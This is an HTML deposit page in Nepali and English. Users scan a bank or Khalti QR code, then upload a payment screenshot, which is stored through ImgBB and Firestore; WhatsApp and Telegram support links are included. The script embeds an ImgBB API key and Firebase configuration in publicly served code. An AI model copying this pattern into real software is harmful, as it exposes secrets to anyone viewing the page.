<!DOCTYPE html>
<html lang="ne">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deposit Money - Final Support</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        body { background-color: #f0f2f5; font-family: 'Segoe UI', sans-serif; padding-bottom: 50px; }
        .deposit-header { background: linear-gradient(135deg, #1e3c72, #2a5298); padding: 30px 20px; text-align: center; color: white; border-radius: 0 0 25px 25px; margin-bottom: 20px; position: relative; }
        .back-btn { position: absolute; left: 20px; top: 35px; color: white; text-decoration: none; font-size: 1.2rem; }
        .qr-section { background: white; border-radius: 20px; padding: 20px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin-bottom: 20px; }
        .qr-code-img { width: 220px; height: auto; max-height: 220px; border: 5px solid #f8f9fa; border-radius: 15px; margin-bottom: 15px; object-fit: contain; }
        .method-selector { display: flex; gap: 10px; margin-bottom: 20px; }
        .method-card { flex: 1; border: 2px solid #eee; border-radius: 15px; padding: 10px; text-align: center; cursor: pointer; transition: 0.3s; background: white; }
        .method-card img { width: 40px; margin-bottom: 5px; }
        .method-card.active { border-color: #1e3c72; background: #eef2f7; }
        
        .download-btn { background: #1e3c72; color: white; border: none; padding: 8px 16px; border-radius: 10px; font-size: 0.9rem; font-weight: bold; width: 100%; margin-top: 10px; transition: 0.3s; }
        .download-btn:hover { background: #2a5298; color: white; }
        
        .support-container { display: flex; flex-direction: column; gap: 12px; margin-top: 25px; }
        .btn-support { display: flex; align-items: center; justify-content: center; padding: 12px; border-radius: 15px; font-weight: bold; text-decoration: none; color: white; transition: 0.3s; }
        .btn-support i { font-size: 1.2rem; margin-right: 10px; }
        .btn-whatsapp { background-color: #25d366; }
        .btn-telegram { background-color: #0088cc; }
        .btn-support:hover { opacity: 0.9; transform: translateY(-2px); color: white; }
    </style>
</head>
<body>

    <div class="deposit-header">
        <a href="home.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <h4>पैसा जम्मा गर्नुहोस् (Deposit)</h4>
        <p class="small opacity-75 mb-0">क्युआर कोड स्क्यान वा डाउनलोड गरी पैसा पठाउनुहोस्</p>
    </div>

    <div class="container">
        <div class="method-selector">
            <div class="method-card active" id="bankCard" onclick="selectMethod('bank')">
                <i class="fa-solid fa-building-columns fa-2x text-primary mb-1"></i>
                <div class="small fw-bold">Bank</div>
            </div>
            <div class="method-card" id="khaltiCard" onclick="selectMethod('khalti')">
                <img src="https://upload.wikimedia.org/wikipedia/en/d/d1/Khalti_Digital_Wallet_Logo.png" alt="Khalti">
                <div class="small fw-bold">Khalti</div>
            </div>
        </div>

        <div class="qr-section">
            <img src="https://i.ibb.co/N2r4ZTdn/bank-qr.jpg" id="qrImage" class="qr-code-img" crossorigin="anonymous">
            <div>
                <button class="download-btn" onclick="downloadQR()">
                    <i class="fa-solid fa-download me-1"></i> QR कोड डाउनलोड गर्नुहोस् (Download)
                </button>
            </div>
            <div class="mt-2 text-muted small"><i class="fa-solid fa-circle-info me-1"></i> माथिको QR स्क्यान वा सेभ गर्नुहोस्</div>
        </div>

        <form id="depositForm" class="bg-white p-3 rounded-4 shadow-sm">
            <div class="mb-3">
                <label class="form-label small fw-bold">जम्मा गर्ने रकम (Amount)</label>
                <div class="input-group">
                    <span class="input-group-text">रु</span>
                    <input type="number" id="amount" class="form-control" placeholder="कति पैसा पठाउनुभयो?" required>
                </div>
            </div>
            <div class="mb-3">
                <label class="form-label small fw-bold">स्क्रीनशट हाल्नुहोस् (Screenshot)</label>
                <input type="file" id="screenshot" class="form-control" accept="image/*" required>
            </div>
            <button type="submit" id="submitBtn" class="btn btn-primary w-100 py-3 rounded-3 fw-bold" style="background: #1e3c72; border: none;">
                विवरण बुझाउनुहोस् (Submit)
            </button>
        </form>

        <div class="support-container">
            <a href="https://wa.me/9779748253225" class="btn-support btn-whatsapp" target="_blank">
                <i class="fa-brands fa-whatsapp"></i> WhatsApp Support
            </a>
            <a href="https://t.me/vvipplan" class="btn-support btn-telegram" target="_blank">
                <i class="fa-brands fa-telegram"></i> Telegram Support
            </a>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBk55D5GqpaVa9zpdYM_p00syFj8tPta4g",
            authDomain: "riya-9c6d4.firebaseapp.com",
            projectId: "riya-9c6d4",
            storageBucket: "riya-9c6d4.firebasestorage.app",
            messagingSenderId: "169192342445",
            appId: "1:169192342445:web:127f76562d4eb3fbfe5724"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const IMGBB_API_KEY = "6f75c5b567c5450a0cf9f545372a89aa";

        const qrLinks = {
            bank: "https://i.ibb.co/N2r4ZTdn/bank-qr.jpg",
            khalti: "https://i.ibb.co/MxQ1X90Q/khalti-qr.jpg"
        };

        window.selectMethod = (method) => {
            const qrImg = document.getElementById('qrImage');
            const bankCard = document.getElementById('bankCard');
            const khaltiCard = document.getElementById('khaltiCard');

            if (method === 'khalti') {
                qrImg.src = qrLinks.khalti;
                khaltiCard.classList.add('active');
                bankCard.classList.remove('active');
            } else {
                qrImg.src = qrLinks.bank;
                bankCard.classList.add('active');
                khaltiCard.classList.remove('active');
            }
        };

        // QR कोड डाउनलोड गर्ने फंक्शन
        window.downloadQR = async () => {
            const qrImg = document.getElementById('qrImage');
            const imageUrl = qrImg.src;
            
            try {
                const response = await fetch(imageUrl);
                const blob = await response.blob();
                const blobUrl = window.URL.createObjectURL(blob);
                
                const a = document.createElement('a');
                a.href = blobUrl;
                a.download = 'payment-qr.jpg';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                window.URL.revokeObjectURL(blobUrl);

                Swal.fire({ toast: true, position: 'top', icon: 'success', title: 'QR कोड डाउनलोड भयो!', showConfirmButton: false, timer: 1500 });
            } catch (error) {
                // यदि CORS ले गर्दा ब्लब डाउनलोड भएन भने लिङ्क डाइरेक्ट खोल्दिन्छ
                window.open(imageUrl, '_blank');
            }
        };

        document.getElementById('depositForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const amount = document.getElementById('amount').value;
            const file = document.getElementById('screenshot').files[0];
            const userPhone = localStorage.getItem("userPhone") || "Unknown";

            if (!file) return;

            submitBtn.disabled = true;
            submitBtn.innerText = "प्रोसेसिङ हुँदैछ...";

            try {
                let formData = new FormData();
                formData.append("image", file);

                const imgResponse = `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`;
                const uploadRes = await fetch(imgResponse, {
                    method: "POST",
                    body: formData
                });
                
                const imgData = await uploadRes.json();
                if(!imgData.success) throw new Error("Image Upload Failed");

                const imageUrl = imgData.data.url;

                await addDoc(collection(db, "deposits"), {
                    userPhone: userPhone,
                    amount: Number(amount),
                    screenshotURL: imageUrl,
                    status: "pending",
                    timestamp: serverTimestamp()
                });

                Swal.fire({
                    title: 'सफल भयो!',
                    text: 'तपाईंको अनुरोध एडमिनकहाँ पुग्यो। कृपया केही समय कुर्नुहोस्।',
                    icon: 'success',
                    confirmButtonColor: '#1e3c72'
                }).then(() => {
                    window.location.href = "home.html";
                });

            } catch (error) {
                Swal.fire('माफ गर्नुहोला!', 'केही समस्या आयो। फेरि प्रयास गर्नुहोला।', 'error');
                submitBtn.disabled = false;
                submitBtn.innerText = "विवरण बुझाउनुहोस् (Submit)";
            }
        });
    </script>
</body>
</html>
